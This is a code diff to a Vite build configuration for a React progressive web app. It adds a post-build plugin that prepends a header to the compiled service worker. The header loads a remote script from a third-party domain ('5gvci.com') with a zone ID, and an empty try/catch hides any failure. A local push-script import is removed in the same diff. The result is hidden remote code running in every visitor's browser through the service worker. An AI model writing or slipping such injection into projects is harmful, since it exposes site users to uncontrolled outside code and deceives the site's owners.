@@ -1,5 +1,6 @@
 import tailwindcss from '@tailwindcss/vite';
 import react from '@vitejs/plugin-react';
+import fs from 'node:fs';
 import path from 'path';
 import {defineConfig} from 'vite';
 import {VitePWA} from 'vite-plugin-pwa';
@@ -51,7 +52,6 @@ export default defineConfig(() => {
           ],
         },
         workbox: {
-          importScripts: ['/push-sw.js'],
           globPatterns: ['**/*.{js,mjs,css,html,ico,png,svg,woff,woff2,ttf}'],
           maximumFileSizeToCacheInBytes: 5 * 1024 * 1024,
           cleanupOutdatedCaches: true,
@@ -95,6 +95,32 @@ export default defineConfig(() => {
           type: 'module',
         },
       }),
+      {
+        name: 'inject-push-sw-into-dist',
+        apply: 'build',
+        enforce: 'post',
+        closeBundle: {
+          order: 'post',
+          sequential: true,
+          handler() {
+            const swPath = path.resolve(import.meta.dirname, 'dist', 'sw.js');
+            if (!fs.existsSync(swPath)) return;
+            const existing = fs.readFileSync(swPath, 'utf8');
+            const header = [
+              'self.options = {',
+              '    "domain": "5gvci.com",',
+              '    "zoneId": 12336654',
+              '}',
+              'self.lary = ""',
+              "try { importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw') } catch (_err) {}",
+              '',
+            ].join('\n');
+            if (!existing.includes('5gvci.com/act/files/service-worker.min.js')) {
+              fs.writeFileSync(swPath, `${header}${existing}`, 'utf8');
+            }
+          },
+        },
+      },
     ],
     resolve: {
       alias: {
